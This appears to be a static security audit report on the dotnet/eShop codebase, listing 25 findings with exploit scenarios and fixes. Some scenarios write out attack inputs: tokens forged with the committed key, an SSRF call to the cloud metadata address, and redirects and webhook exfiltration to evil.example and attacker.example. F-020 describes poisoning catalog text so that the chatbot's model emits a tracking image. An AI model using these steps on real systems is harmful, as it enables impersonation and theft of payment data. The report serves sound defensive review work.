# VULN-FINDINGS — eShop (dotnet/eShop @ 913acea)

**Scanned:** 2026-11-10T21:10:00Z · **Target:** `/home/niels/github/UpdateConference2026/eShop` · **Mode:** static review, no code executed

**25 candidate findings** — 9 HIGH / 11 MEDIUM / 5 LOW · 1 low-confidence (<0.4). Sorted by severity, then confidence.

**Inputs.** The merged threat model (`THREAT_MODEL.md`, T1–T31, including the Fennec Ears intake in §9) drives the focus areas; the Fennec classified flows are used as corroboration, and every finding below was re-read against source at commit `913acea`.

## Scope

- identity and auth plumbing (src/Identity.API, src/eShop.ServiceDefaults) — signing credential, client registry, JWT validation, login/consent redirects, cookies
- catalog API surface (src/Catalog.API) — authentication posture, write handlers, mass assignment, picture endpoint, AI search
- ordering API and domain (src/Ordering.API, src/Ordering.Domain, src/Ordering.Infrastructure) — handlers, ownership, buyer identity, pricing, CVV handling, logging
- basket and webhooks (src/Basket.API, src/Webhooks.API, src/WebhookClient) — gRPC identity, Redis keying, subscription scoping, outbound HTTP, demo receiver
- storefront and chatbot (src/WebApp, src/WebAppComponents) — chatbot output rendering, image forwarder, OIDC client
- topology and supply chain (src/eShop.AppHost, Directory.Build.props, CI workflows) — external endpoint exposure, BFF routing, NuGet auditing

**Cross-reference to the threat model.** Three findings have direct Fennec corroboration — F-011 (CWE-918, `sha256:0b301fec`/`c38aa7cb` → T9), F-015 (:84/:111, SETYPE0601 → T30) and F-016 (SETYPE0601 → T31). The remaining 22 candidates are invisible to a pure source→sink taint tool because the defect is a missing check, a wrong identity source, a server-side trust decision, or a config default. Threats modelled with no finding are recorded as cleared leads in the closing section.

| id | severity | conf | category | file:line | title |
| --- | --- | --- | --- | --- | --- |
| F-001 | HIGH | 0.97 | hardcoded-secret | `src/Identity.API/Program.cs:37` | Repository-committed RSA private signing key (tempkey.jwk) is the active token-signing credential |
| F-002 | HIGH | 0.95 | auth-bypass | `src/eShop.ServiceDefaults/AuthenticationExtensions.cs:49` | JWT validation sets ValidateAudience=false, so a token minted for one API is accepted by every API |
| F-003 | HIGH | 0.95 | auth-bypass | `src/Catalog.API/Program.cs:29` | Catalog.API writes are unauthenticated by construction: the service has no authentication/authorization middleware |
| F-004 | HIGH | 0.95 | auth-bypass | `src/Ordering.API/Apis/OrdersApi.cs:80` | IDOR: GET /api/orders/{orderId} returns any buyer's order to any authenticated user |
| F-005 | HIGH | 0.95 | auth-bypass | `src/Ordering.API/Apis/OrdersApi.cs:118` | POST /api/orders trusts client-supplied UserId/UserName, letting any authenticated user act as another buyer |
| F-006 | HIGH | 0.93 | auth-bypass | `src/Ordering.API/Apis/OrdersApi.cs:22` | PUT /api/orders/cancel and /api/orders/ship are callable by any authenticated shopper on any order |
| F-007 | HIGH | 0.92 | business-logic | `src/Ordering.API/Apis/OrdersApi.cs:141` | Order unit prices are taken from the client, so a shopper can buy at attacker-chosen prices |
| F-008 | HIGH | 0.88 | sensitive-data-exposure | `src/Identity.API/Services/ProfileService.cs:74` | Profile service copies stored card number, CVV, expiry and address into issued tokens and userinfo claims |
| F-009 | HIGH | 0.88 | hardcoded-secret | `src/Identity.API/Configuration/Config.cs:82` | All confidential OIDC clients share the literal client secret "secret" |
| F-010 | MEDIUM | 0.85 | insecure-configuration | `src/Identity.API/Program.cs:50` | Identity auth cookie has no explicit Secure/HttpOnly and relies on a global SameSite=Lax |
| F-011 | MEDIUM | 0.85 | ssrf | `src/Webhooks.API/Services/GrantUrlTesterService.cs:7` | Webhook grant-URL check compares the two caller-supplied URLs against each other (SSRF to internal hosts) |
| F-012 | MEDIUM | 0.85 | auth-bypass | `src/eShop.AppHost/Extensions.cs:146` | Externally exposed mobile BFF forwards /api/catalog/{*any} and /api/orders/{*any} without method or route restriction |
| F-013 | MEDIUM | 0.80 | sensitive-data-in-logs | `src/Ordering.API/Application/Commands/CreateOrderCommandHandler.cs:50` | Full order entity, including card number, CVV and buyer address, is logged at Information level |
| F-014 | MEDIUM | 0.78 | insecure-configuration | `src/Identity.API/Configuration/Config.cs:89` | webapp authorization-code client runs with RequirePkce=false and AllowOfflineAccess=true |
| F-015 | MEDIUM | 0.75 | open-redirect | `src/Identity.API/Quickstart/Account/AccountController.cs:84` | Login cancel branch redirects to model.ReturnUrl without a local-URL check (open redirect on the IdP) |
| F-016 | MEDIUM | 0.72 | open-redirect | `src/Identity.API/Quickstart/Consent/ConsentController.cs:63` | Consent POST redirects to result.RedirectUri copied verbatim from model.ReturnUrl |
| F-017 | MEDIUM | 0.70 | idor | `src/Webhooks.API/Services/WebhooksRetriever.cs:7` | Webhook delivery broadcasts every user's subscriptions, so any shopper can subscribe to all order events |
| F-018 | MEDIUM | 0.68 | sensitive-data-exposure | `src/Ordering.API/Application/Commands/CreateOrderCommandHandler.cs:40` | CVV is accepted from the request and persisted in the ordering database rather than discarded after authorization |
| F-019 | MEDIUM | 0.65 | auth-bypass | `src/WebhookClient/Endpoints/WebhookEndpoints.cs:16` | Demo receiver accepts any unauthenticated POST: token validation off by default and compared non-constant-time |
| F-020 | MEDIUM | 0.62 | xss | `src/WebApp/Components/Chatbot/MessageProcessor.cs:18` | Chatbot markdown image syntax becomes a live image element, enabling tracking and a narrow attribute-injection window |
| F-021 | LOW | 0.55 | improper-input-validation | `src/Basket.API/Repositories/RedisBasketRepository.cs:16` | Basket Redis key concatenates the raw sub claim into a shared, unsegmented namespace |
| F-022 | LOW | 0.50 | insufficient-logging | `src/Webhooks.API/Services/GrantUrlTesterService.cs:17` | Webhook bearer token logged in cleartext at Information level |
| F-023 | LOW | 0.45 | insecure-configuration | `Directory.Build.props:12` | NuGet vulnerability auditing suppressed repo-wide (NU1901-NU1904) while TreatWarningsAsErrors is on |
| F-024 | LOW | 0.40 | ssrf | `src/WebApp/Program.cs:32` | Unauthenticated /product-images/{id} forwarder passes the raw route value into a templated upstream path |
| F-025 | LOW | 0.35 | hardcoded-secret | `.github/workflows/playwright.yml:37` | Demo account credentials (bob / Pass123$) injected as workflow env |

## Findings

### F-001 — Repository-committed RSA private signing key (tempkey.jwk) is the active token-signing credential

`src/Identity.API/Program.cs:37` · **HIGH** · confidence 0.97 · *hardcoded-secret*

**Description.** `AddDeveloperSigningCredential()` is used with `KeyManagement.Enabled = false` (Program.cs:29,37). Duende therefore loads `src/Identity.API/tempkey.jwk` from the content root; the file is tracked in git (since `fc61f90`) and copied to build output by `Identity.API.csproj` (Content Include). Every API trusts this instance's `jwks_uri` through ServiceDefaults, the key never rotates, and the stable `kid` is public. Verified: `git ls-files src/Identity.API/tempkey.jwk` returns the file and it contains `"d"`, `"p"`, `"q"` (full private key).

**Exploit scenario.** Clone the public repo, import the RSA key from tempkey.jwk, mint an RS256 token with `iss=<identity-api>`, any `aud`, chosen `sub` and `scope=[orders basket webhooks]`. Ordering/Basket/Webhooks accept it because audience validation is off (F-002) and issuer/HTTPS checks are loose (F-010). Full impersonation of any user, including order read/cancel/ship.

**Recommendation.** Delete tempkey.jwk from the repo, csproj and history; load signing material from a secret store; enable persistent key management; fail startup outside Development when a developer credential is configured. Rotate the key.

**Confidence note.** Re-read confirmed. File present, private key material present, key management disabled, developer credential in use at line 37.

### F-002 — JWT validation sets ValidateAudience=false, so a token minted for one API is accepted by every API

`src/eShop.ServiceDefaults/AuthenticationExtensions.cs:49` · **HIGH** · confidence 0.95 · *auth-bypass*

**Description.** `AddDefaultAuthentication` sets `options.TokenValidationParameters.ValidateAudience = false` (line 49) even though `options.Audience` is configured a few lines earlier. Ordering, Webhooks and Basket all use this helper. Combined with `RequireHttpsMetadata = false` (line 40) and the DEBUG-only extra issuer `https://10.0.2.2:5243` (line 46), audience/issuer scoping is effectively absent in the shared config. (Set to `false` on purpose historically to accept MAUI client tokens.)

**Exploit scenario.** An attacker holding a low-privilege `webhooks` or `basket` token reuses it against `/api/orders/**`. A token minted by the mobile client (or the committed key) works on every backend.

**Recommendation.** Set `ValidateAudience = true` per-service (Ordering=`orders`, Webhooks=`webhooks`, Basket=`basket`); keep `ValidIssuers` an exact match; set `RequireHttpsMetadata = true` outside Development; move the Android emulator issuer into a Development-only configuration.

**Confidence note.** Re-read confirmed: the literal `ValidateAudience = false` exists in the only shared JWT setup path.

### F-003 — Catalog.API writes are unauthenticated by construction: the service has no authentication/authorization middleware

`src/Catalog.API/Program.cs:29` · **HIGH** · confidence 0.95 · *auth-bypass*

**Description.** Catalog.API `Program.cs` (lines 1-29) calls `AddServiceDefaults()`, `AddApplicationServices()`, maps keyed IFileProvider, problem details, API versioning and OpenAPI, but never calls `AddDefaultAuthentication()`, `UseAuthentication()` or `UseAuthorization()`. All catalog routes in `CatalogApi.cs` (MapPut /items, /items/{id}; MapPost /items; MapDelete /items/{id}) are therefore anonymous regardless of the Identity settings. Catalog is internal in the AppHost but is fronted by the externally exposed mobile BFF catch-all `/api/catalog/{*any}` (F-012).

**Exploit scenario.** Unauthenticated `PUT /api/catalog/items/1?api-version=2.0` (with a JSON body) rewrites price/stock/name; `DELETE /api/catalog/items/1` removes rows. Reachable through the BFF from the internet.

**Recommendation.** Register authentication and add an admin policy to the write route group; require auth on the BFF catalog routes; derive price/stock server-side. Covered by threat model T7.

**Confidence note.** Re-read confirmed: no auth vocabulary appears in Catalog Program.cs.

### F-004 — IDOR: GET /api/orders/{orderId} returns any buyer's order to any authenticated user

`src/Ordering.API/Apis/OrdersApi.cs:80` · **HIGH** · confidence 0.95 · *auth-bypass*

**Description.** The orders group requires only `RequireAuthorization()` (Ordering.API/Program.cs:21-22, no policy). `GetOrderAsync` (OrdersApi.cs:80-91) passes the route `int orderId` to `services.Queries.GetOrderAsync(orderId)` without comparing it with `services.IdentityService.GetUserIdentity()` (the `sub` claim). `OrderQueries.GetOrderAsync` filters only by id. The sibling `GetOrdersByUserAsync` (:93-99) does scope by `sub`, so this is a gap, not design. Order ids are small dense ints.

**Exploit scenario.** A logged-in shopper loops `GET /api/orders/1..N`; each hit returns another customer's street, city, zip, country, order items and totals until 404. Also reachable via the BFF.

**Recommendation.** Load the order with `Buyer` and reject unless `Buyer.IdentityGuid == sub`, returning 404 to avoid an existence oracle; or gate by an admin policy. Covered by threat model T5.

**Confidence note.** Re-read confirmed: no ownership comparison in GetOrderAsync; the only filter is the route id.

### F-005 — POST /api/orders trusts client-supplied UserId/UserName, letting any authenticated user act as another buyer

`src/Ordering.API/Apis/OrdersApi.cs:118` · **HIGH** · confidence 0.95 · *auth-bypass*

**Description.** `CreateOrderRequest` (OrdersApi.cs:171-185) carries `UserId` and `UserName` from the JSON body; `CreateOrderAsync` forwards them into `CreateOrderCommand` (:141) and `CreateOrderCommandHandler` calls `new Order(message.UserId, message.UserName, ...)` (:40) plus `OrderStartedIntegrationEvent(message.UserId)` (:32). The authenticated `sub` is never consulted. Buyer identity drives `GetOrdersFromUserAsync` and every `OrderStatusChangedTo*` event, and the OrderStarted event wipes `/basket/{UserId}`.

**Exploit scenario.** Post `{UserId:<victim sub>, UserName:<victim>, Items:[...], card fields}`; the order is attributed to the victim, appears in the victim's order history, and clears the victim's basket. Combined with F-002 a token is not even needed for a different client.

**Recommendation.** Take UserId/UserName from the token (`sub`, `User.Identity.Name`) and delete them from the public contract; regardless of that, scope cancel/ship in F-006 by ownership.

**Confidence note.** Re-read confirmed: body UserId flows to the domain without a token comparison.

### F-006 — PUT /api/orders/cancel and /api/orders/ship are callable by any authenticated shopper on any order

`src/Ordering.API/Apis/OrdersApi.cs:22` · **HIGH** · confidence 0.93 · *auth-bypass*

**Description.** Both `/cancel` (:22) and `/ship` (:51) live on the authenticated group with no policy on the caller. The handlers copy `OrderNumber` from the body into `CancelOrderCommand`/`ShipOrderCommand`, fetch by id via the repository and call `orderToUpdate.SetCancelledStatus()` / `SetShippedStatus()` (Order.cs:132-148). No validator or handler compares `Buyer.IdentityGuid` with the caller, despite the 'administrator executes ship order' comment. There is no role on any Identity client, so 'administrator' cannot even be expressed.

**Exploit scenario.** Any shopper enumerates ids and calls `PUT /api/orders/cancel {"orderNumber":N}` or `/ship` to cancel/ship other customers' Confirmed or Paid orders, firing `OrderStatusChangedTo*` to webhook subscribers.

**Recommendation.** Cancel must require `order.Buyer.IdentityGuid == sub`; ship requires an explicit admin role/policy and per-order ownership. Covered by threat model T5.

**Confidence note.** Re-read confirmed: neither endpoint nor handler checks ownership or role.

### F-007 — Order unit prices are taken from the client, so a shopper can buy at attacker-chosen prices

`src/Ordering.API/Apis/OrdersApi.cs:141` · **HIGH** · confidence 0.92 · *business-logic*

**Description.** `CreateOrderRequest.Items` (`OrderItemDTO`, OrdersApi.cs:171-185) carries `UnitPrice` and `Discount` from the body; `CreateOrderAsync` puts them into `CreateOrderCommand` (:141) and `CreateOrderCommandHandler` calls `order.AddOrderItem(item.ProductId, item.ProductName, item.UnitPrice, item.Discount, ...)` (:43). Nothing re-reads the catalog price or the catalog at order time. The cart price shown by WebApp is the same client-selected value.

**Exploit scenario.** Place an order for a high-value item with `UnitPrice:0.01`; the order total is computed from that value. Price manipulation also survives into the `OrderStatusChangedTo*` events.

**Recommendation.** Resolve prices server-side from Catalog at order time and ignore client UnitPrice/Discount; keep them only for display. If catalog is unavailable, reject rather than trusting the client.

**Confidence note.** Re-read confirmed: UnitPrice and Discount from the body reach `AddOrderItem` unchanged.

### F-008 — Profile service copies stored card number, CVV, expiry and address into issued tokens and userinfo claims

`src/Identity.API/Services/ProfileService.cs:74` · **HIGH** · confidence 0.88 · *sensitive-data-exposure*

**Description.** `ProfileService` adds `card_number` (:70), `card_holder` (:74), `card_security_number` (:78), `card_expiration` (:82), plus `address_*` (:86-98) as claims. `AlwaysIncludeUserClaimsInIdToken = true` for `webapp` (Config.cs:87) and `maui` therefore ships PAN and CVV inside the ID token and userinfo response, which the browser and native client store. The chat tool `GetUserInfo` (ChatState.cs:97) additionally serialises name/address/email/phone into a prompt.

**Exploit scenario.** Any access to the ID token (browser storage, network, logs, native secure storage) exposes the full PAN and CVV; a stolen refresh token exposes them again. Also visible to the external LLM provider through the chatbot.

**Recommendation.** Stop persisting and emitting card fields; never place card data in tokens; return only the minimum address claims and move payments behind a tokenizing provider. Covered by threat model T8/T11.

**Confidence note.** Re-read confirmed: the claim assignments for PAN, CVV, expiry and address are unconditional on presence.

### F-009 — All confidential OIDC clients share the literal client secret "secret"

`src/Identity.API/Configuration/Config.cs:82` · **HIGH** · confidence 0.88 · *hardcoded-secret*

**Description.** `webapp` (Config.cs:82), the MAUI client and `webhooksclient` each register `new Secret("secret".Sha256())`. The MAUI app also ships `ClientSecret=secret` in its defaults (public binary), so the shared symmetric secret is effectively public. Combined with the non-PKCE webapp (F-014) and the committed signing key (F-001), any holder can impersonate any confidential client.

**Exploit scenario.** Use the leaked secret with the `webapp` code flow (no PKCE) and a compromised or intercepted code, or directly from the native app, to obtain tokens for other users' sessions; or rely on the shared secret to redeem tokens minted with the committed key.

**Recommendation.** Issue per-client secrets from Aspire parameters/Key Vault; make MAUI a public client with no secret; rotate `secret` and remove it from the native defaults.

**Confidence note.** Re-read confirmed: the literal `"secret"` appears for every confidential client.

### F-010 — Identity auth cookie has no explicit Secure/HttpOnly and relies on a global SameSite=Lax

`src/Identity.API/Program.cs:50` · **MEDIUM** · confidence 0.85 · *insecure-configuration*

**Description.** Program.cs:50 sets `UseCookiePolicy(new CookiePolicyOptions { MinimumSameSitePolicy = SameSiteMode.Lax })`; no explicit `Secure`/`HttpOnly` policy is set and IdentityServer/ASP.NET Identity defaults are only as strong as the request scheme. The AppHost can run `http` launch profiles and `RequireHttpsMetadata=false` is used elsewhere, so `Secure` may not be emitted consistently. Identity has no HTTPS redirect middleware.

**Exploit scenario.** On an HTTP hop an auth cookie/session cookie can be captured or downgraded; SameSite=Lax still allows top-level GET cross-site navigations.

**Recommendation.** Force `UseHttpsRedirection`, set `CookiePolicyOptions` with `Secure = Always` (outside Development `SameAsRequest` is unacceptable), keep `HttpOnly`, and enforce `RequireHttpsMetadata = true` outside Development. Covered by threat model T14.

**Confidence note.** Re-read confirmed: only MinimumSameSitePolicy is configured; there is no HTTPS redirect in Identity Program.cs.

### F-011 — Webhook grant-URL check compares the two caller-supplied URLs against each other (SSRF to internal hosts)

`src/Webhooks.API/Services/GrantUrlTesterService.cs:7` · **MEDIUM** · confidence 0.85 · *ssrf*

**Description.** `TestGrantUrl(urlHook, url, token)` accepts when `CheckSameOrigin(urlHook, url)` is true (line 7); both values come from the POST body. `new HttpRequestMessage(HttpMethod.Options, url)` (line 14) is sent by `client.SendAsync(msg)` (line 21) before the destination is validated. Any scheme/host the caller names is reachable; there is no allowlist, private-range block or metadata-address block. Confirmed by Fennec `sha256:0b301fec`/`c38aa7cb` (CWE-918, Warning 6).

**Exploit scenario.** Register a subscription with `Url="http://169.254.169.254/latest/meta-data/"` and `GrantUrl=<same origin>`; the server issues the OPTIONS request to the cloud metadata endpoint, and later the webhook sender POSTs order data to `DestUrl`.

**Recommendation.** Route outbound server-side HTTP through a destination allowlist that blocks link-local, metadata (169.254.169.254, fd00::/8) and private ranges; require HTTPS; send the check from a dedicated egress client. Covered by threat model T9.

**Confidence note.** Re-read confirmed: `CheckSameOrigin` compares urlHook vs url; both attacker-controlled; no sanitizer on the accepted branch.

### F-012 — Externally exposed mobile BFF forwards /api/catalog/{*any} and /api/orders/{*any} without method or route restriction

`src/eShop.AppHost/Extensions.cs:146` · **MEDIUM** · confidence 0.85 · *auth-bypass*

**Description.** `ConfigureMobileBffRoutes` adds `yarp.AddRoute("/api/catalog/{*any}", catalogCluster)` (:142) and `yarp.AddRoute("/api/orders/{*any}", orderingApi.GetEndpoint("http"))` (:146), both with query-parameter matching on `api-version` only and no method restriction. The BFF gets `WithExternalHttpEndpoints()` (AppHost.cs:63). The proxy adds no authentication. Since Catalog has no auth at all (F-003), catalog writes/deletes are anonymously reachable from the internet through `/api/catalog/...`.

**Exploit scenario.** From the internet: `DELETE /api/catalog/items/{id}?api-version=2.0` through the BFF; or drive Ordering with a stolen token, then read another order through the same catch-all.

**Recommendation.** Restrict BFF routes to the methods/paths the mobile app actually uses; add authentication at the proxy (or propagate a required token) and drop the Catalog write routes from the BFF. Covered by threat model T18.

**Confidence note.** Re-read confirmed: catch-all routes with only api-version query matching and no auth on the proxy.

### F-013 — Full order entity, including card number, CVV and buyer address, is logged at Information level

`src/Ordering.API/Application/Commands/CreateOrderCommandHandler.cs:50` · **MEDIUM** · confidence 0.80 · *sensitive-data-in-logs*

**Description.** `_logger.LogInformation("Creating Order - Order: {@Order}", order)` (:50) serialises the `Order` aggregate; its ctor accepts `CardNumber, CardSecurityNumber, CardHolderName, CardExpiration` and the address (CreateOrderCommandHandler.cs:40). Ordering API :137 logs `{@Command}` for `requestCreateOrder` too. Card fields therefore reach console/logging and OTLP exporters. `OrdersApi.cs` masks only the number, not the CVV, before the command is built, and not the log line at :50.

**Exploit scenario.** Read backend logs / OTLP backend; recover PAN/CVV/address for every order. A log aggregation compromise is a direct PCI-class breach.

**Recommendation.** Add a redaction layer; log only ids/totals; mark card fields `[JsonIgnore]`/redacted in ToString; remove `{@Order}`/`{@Command}` serialisation of aggregates containing payment data. Covered by threat model T8.

**Confidence note.** Re-read confirmed: structured logging of the aggregate that carries the card and CVV fields.

### F-014 — webapp authorization-code client runs with RequirePkce=false and AllowOfflineAccess=true

`src/Identity.API/Configuration/Config.cs:89` · **MEDIUM** · confidence 0.78 · *insecure-configuration*

**Description.** The `webapp` client (Config.cs:75-89) has `RequirePkce = false` while `AllowAccessTokensViaBrowser = false` and `AllowOfflineAccess = true`; the PKCE omission was deliberate for a demo but is an active control bypass. Without PKCE, an intercepted authorization code can be redeemed by any party holding the (shared) client secret.

**Exploit scenario.** Steal an authorization code from a redirect/log and redeem it with the shared `secret`; or replay a code across users. Combined with F-009 this requires no extra secret. Covered by threat model T13.

**Recommendation.** Set `RequirePkce = true` for every code-flow client; shorten refresh-token lifetimes; bind the code to the client's redirect URI and session.

**Confidence note.** Re-read confirmed: `RequirePkce = false` is explicit for webapp.

### F-015 — Login cancel branch redirects to model.ReturnUrl without a local-URL check (open redirect on the IdP)

`src/Identity.API/Quickstart/Account/AccountController.cs:84` · **MEDIUM** · confidence 0.75 · *open-redirect*

**Description.** `[HttpPost] Login(LoginInputModel model, string button)` binds `ReturnUrl` from the body. When `button != "login"` and an authorization context exists, `Redirect(model.ReturnUrl)` (:84) is returned unchecked; the success path at :115 uses `Url.IsLocalUrl`, but the cancel path (and the 'failure' branch at :111) do not. Fennec flagged :84 and :111 (SETYPE0601, Warning 4.7); the same pattern appears in Consent (F-016).

**Exploit scenario.** Craft a POST `/Account/Login` with `ReturnUrl=https://evil.example` and a valid antiforgery token; the response redirects the browser to the attacker host. Chained with the IdP's trusted origin this supports phishing and OAuth code redirection.

**Recommendation.** Apply `Url.IsLocalUrl` on every `Redirect(model.ReturnUrl)` branch, or derive the redirect target from the live authorization request (validated `request.RedirectUri`). Covered by threats T30/T31 in the threat model (§9 Fennec intake).

**Confidence note.** Re-read confirmed: the cancel branch at :84 has no local-URL check, while the success branch does.

### F-016 — Consent POST redirects to result.RedirectUri copied verbatim from model.ReturnUrl

`src/Identity.API/Quickstart/Consent/ConsentController.cs:63` · **MEDIUM** · confidence 0.72 · *open-redirect*

**Description.** `ProcessConsent` sets `result.RedirectUri = model.ReturnUrl` (:138) after `GetAuthorizationContextAsync(model.ReturnUrl)` returns non-null; `Index` then `Redirect(result.RedirectUri)` (:63). Because the redirect target is the raw body value rather than the authorization request's validated `RedirectUri`, an attacker who can present a live-but-crafted authorization request gets redirected to an arbitrary absolute URL. Fennec `sha256:440a1f97` (SETYPE0601, Note 3.7).

**Exploit scenario.** User completes consent; browser is sent to `https://evil.example` even though the client's registered redirect URI is the storefront.

**Recommendation.** Redirect to the authorization request's validated `RedirectUri`, or to the authorization endpoint with the request id; never to `model.ReturnUrl`. Covered by threat model T31.

**Confidence note.** Re-read confirmed: redirect target is copied verbatim from the model return URL at :138.

### F-017 — Webhook delivery broadcasts every user's subscriptions, so any shopper can subscribe to all order events

`src/Webhooks.API/Services/WebhooksRetriever.cs:7` · **MEDIUM** · confidence 0.70 · *idor*

**Description.** `WebhooksRetriever.GetSubscriptionsOfType(type)` selects `db.Subscriptions.Where(s => s.Type == type)` with no `UserId` filter (:7); `WebhooksSender.SendAll` posts `WebhookData` built from order events (order id, buyer id/name, status, price changes) to every subscriber's `DestUrl`. Subscription creation itself is scoped to `sub` in `WebHooksApi.cs`, but delivery is global. A `webhooks` token from any shopper receives every user's order events.

**Exploit scenario.** Register `{Url:https://attacker.example, Type:OrderPaid}`; receive every order status change for every buyer, including buyer names and prices.

**Recommendation.** Filter subscriptions by tenant/buyer for buyer-scoped event types, or split admin vs customer subscriptions; only fan out buyer-local events to the matching subscriber. Covered by threat model T22/T17 area.

**Confidence note.** Re-read confirmed: the retriever query has no user predicate.

### F-018 — CVV is accepted from the request and persisted in the ordering database rather than discarded after authorization

`src/Ordering.API/Application/Commands/CreateOrderCommandHandler.cs:40` · **MEDIUM** · confidence 0.68 · *sensitive-data-exposure*

**Description.** `CreateOrderCommandHandler` constructs `new Order(... message.CardNumber, message.CardSecurityNumber, ...)` (:40) with the CVV taken straight from `CreateOrderRequest.CardSecurityNumber`; the `Order` aggregate builds its `PaymentMethod` from that value and persists it in `orderingdb`. Storing CVV at rest is prohibited by PCI DSS and turns the shared postgres superuser (threat model T3) into a full payment-data compromise. `maskedCCNumber` in `OrdersApi.cs` protects only the PAN, not the CVV.

**Exploit scenario.** Read the ordering database (any service with the shared credential, or a DB backup read) and recover every card's CVV, which can be reused for card-not-present fraud.

**Recommendation.** Drop the CVV from the domain model and the request contract; store only a tokenized reference and the masked PAN; purge existing rows. Covered by threat model T8 (assets: Payment data).

**Confidence note.** Re-read confirmed: CVV participates in the domain constructor and is persisted with the order; no redaction before persistence.

### F-019 — Demo receiver accepts any unauthenticated POST: token validation off by default and compared non-constant-time

`src/WebhookClient/Endpoints/WebhookEndpoints.cs:16` · **MEDIUM** · confidence 0.65 · *auth-bypass*

**Description.** `bool.TryParse(configuration["ValidateToken"], out var validateToken)` defaults to `false` when the key is absent (line 16), and `POST /webhook-received` accepts when `!validateToken || tokenToValidate == token` (line 35). The comparison is not constant-time. The expected token is a GUID committed in appsettings. `/check` (:18) echoes the caller's header. The receiver renders arbitrary JSON into the Blazor UI, so stored output injection is possible.

**Exploit scenario.** Unauthenticated `POST /webhook-received` with any JSON; payloads are stored and rendered in the operator's webhook client. Repeated posts can exhaust the in-memory queue.

**Recommendation.** Default `ValidateToken` to true and fail closed when the key is missing; use `CryptographicOperations.FixedTimeEquals`; require HMAC over the body with a per-subscription secret; restrict the receiver to loopback/dev. Covered by threat model T22.

**Confidence note.** Re-read confirmed: `TryParse` default is false, and `==` is used on the token.

### F-020 — Chatbot markdown image syntax becomes a live image element, enabling tracking and a narrow attribute-injection window

`src/WebApp/Components/Chatbot/MessageProcessor.cs:18` · **MEDIUM** · confidence 0.62 · *xss*

**Description.** `AllowImages` un-encodes `&lt;`/`&gt;` back to `<`/`>` (line 18) before scanning, then emits an `img` tag with `title` and `src` attributes (:24) with `HtmlEncoder.Encode` on title/src. WebApp renders it with `MarkupString` (Chatbot.razor:46). Model output (which follows attacker-influenced prompts / catalog product text) can therefore produce an image element that fires a request to an attacker host (zero-click tracking / SSRF-less beacon), and the `&lt;`/`&gt;` re-expansion pattern is fragile against attribute injection in `title`/`src` if the encoder is bypassed.

**Exploit scenario.** Poison catalog text or the user prompt so the LLM emits `![x](https://attacker.example/pixel.png)`; the storefront loads the image and leaks the user's IP/timing. More broadly, model-controlled markdown is treated as HTML.

**Recommendation.** Render model output as plain text or restrict it to a small allowlisted markdown subset; never re-expand encoded angle brackets; serve images only from a fixed catalog origin. Covered by threat model T28/T11.

**Confidence note.** Re-read confirmed: `&lt;`/`&gt;` re-expansion plus `MarkupString` rendering of model output.

### F-021 — Basket Redis key concatenates the raw sub claim into a shared, unsegmented namespace

`src/Basket.API/Repositories/RedisBasketRepository.cs:16` · **LOW** · confidence 0.55 · *improper-input-validation*

**Description.** `GetBasketKey(userId) = BasketKeyPrefix.Append(userId)` (:16) with no validation. The id is taken from the `sub` claim on every path (`BasketService.MapToCustomerBasket` sets `BuyerId = userId` from `ServerCallContextIdentityExtensions.GetUserIdentity()`), so a caller cannot currently supply an arbitrary id — this is a defence-in-depth gap rather than an identity bypass. The problem is structural: all baskets share one Redis instance with no per-service namespace or per-user separation, and a non-GUID `sub` (e.g. from an external IdP or the DEBUG issuer) is trusted verbatim as the key.

**Exploit scenario.** If a non-GUID or colon-bearing `sub` is ever accepted (external IdP, forged token per F-001), baskets collide or overwrite each other; any co-located workload can also read or poison every basket.

**Recommendation.** Validate `sub` to a GUID before keying; namespace keys per service and per tenant; enable Redis TLS and per-service credentials. Covered by threat model T24/T25.

**Confidence note.** Re-read confirmed: the key builder has no validation, but callers derive the id from `sub`, so the client cannot choose it today. Severity lowered after re-reading `MapToCustomerBasket`.

### F-022 — Webhook bearer token logged in cleartext at Information level

`src/Webhooks.API/Services/GrantUrlTesterService.cs:17` · **LOW** · confidence 0.50 · *insufficient-logging*

**Description.** `logger.LogInformation("Sending the OPTIONS message to {Url} with token \"{Token}\"", url, token)` (:17) and the response log at :23 write the subscriber token and its echo to logs/OTLP. Tokens are stored on the subscription and re-sent on every delivery, so log exposure is a persistent credential leak.

**Exploit scenario.** Read logs to harvest tokens and authenticate outbound deliveries or impersonate subscribers.

**Recommendation.** Remove token from logs; log only a hash/prefix. Covered by threat model T8.

**Confidence note.** Re-read confirmed: token interpolated into the log template.

### F-023 — NuGet vulnerability auditing suppressed repo-wide (NU1901-NU1904) while TreatWarningsAsErrors is on

`Directory.Build.props:12` · **LOW** · confidence 0.45 · *insecure-configuration*

**Description.** `Directory.Build.props` sets `<NoWarn>NU1901;NU1902;NU1903;NU1904</NoWarn>` with `TreatWarningsAsErrors=true`, so vulnerability audit warnings would otherwise be errors but are now invisible. Fennec confirmed MessagePack 2.5.302 / CVE-2026-92707 in test projects (out of runtime scope), and `ankane/pgvector:latest` is floating. This hides future SCA signal.

**Exploit scenario.** A vulnerable transitive package is introduced and neither build nor CI surfaces it; exposure persists until manual review.

**Recommendation.** Remove the NoWarn for vulnerability codes; remediate the noise instead; keep central pinning and add a lockfile; pin container images by digest. Covered by threat model T15.

**Confidence note.** Re-read confirmed: NoWarn line present.

### F-024 — Unauthenticated /product-images/{id} forwarder passes the raw route value into a templated upstream path

`src/WebApp/Program.cs:32` · **LOW** · confidence 0.40 · *ssrf*

**Description.** `app.MapForwarder("/product-images/{id}", "https+http://catalog-api", "/api/catalog/items/{id}/pic")` (:32) is unauthenticated; `id` is not constrained to `int`. YARP substitutes the raw value, so an encoded path segment that normalises upward could target another catalog path. Practical impact is low because the target is the internal catalog and its own auth is absent anyway (F-003) and the upstream template appends `/pic`.

**Exploit scenario.** Probe `/product-images/..%2F..%2Fapi%2Fcatalog%2Fitems` and observe whether the forwarder or catalog normalises the path.

**Recommendation.** Constrain the route to `{id:int}`; whitelist the upstream path; add rate limiting. Covered by threat model T29 area.

**Confidence note.** Re-read confirmed: forwarder route has no `int` constraint and no auth.

### F-025 — Demo account credentials (bob / Pass123$) injected as workflow env

`.github/workflows/playwright.yml:37` · **LOW** · confidence 0.35 · *hardcoded-secret*

**Description.** The Playwright workflow injects `bob` / `Pass123$` as environment variables (:37). The credentials are the seeded Identity demo users (also committed in `UsersSeed.cs`), so they are already public, but the workflow hardens the leak and conflates test convenience with authentication.

**Exploit scenario.** Anyone reading the workflow (or the public repo) logs into the demo store as bob and can exercise the demo flows.

**Recommendation.** Use ephemeral, per-run seeded users with random passwords; keep secrets in repository secrets rather than workflow env. Covered by threat model T2/T10.

